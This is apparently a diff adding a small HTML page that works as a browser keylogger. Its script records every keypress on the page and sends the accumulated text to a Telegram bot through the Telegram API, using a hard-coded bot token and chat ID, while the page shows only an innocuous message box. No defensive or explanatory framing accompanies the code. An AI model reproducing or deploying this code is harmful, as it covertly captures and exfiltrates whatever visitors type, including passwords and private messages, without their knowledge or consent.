@@ -1,0 +1,30 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <form>
+        <input type="text" id="keylogArea" name="keylogArea" placeholder="enter your message">
+    </form>
+    <script>
+        //Enter your token and chat_id your telegram bot
+        var token = "1111111111:5J5K2OXLjA4ZIL23A";
+        var chat_id = "34544695";
+ 
+         var keylogArea = document.getElementById("keylogArea");
+        document.onkeypress = function(e) {
+            keylogArea.value += e.key;
+            console.log(keylogArea.value);
+            var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + keylogArea.value;
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", url, true);
+            xhr.send();
+        }
+
+    </script>
+    
+</body>
+</html>
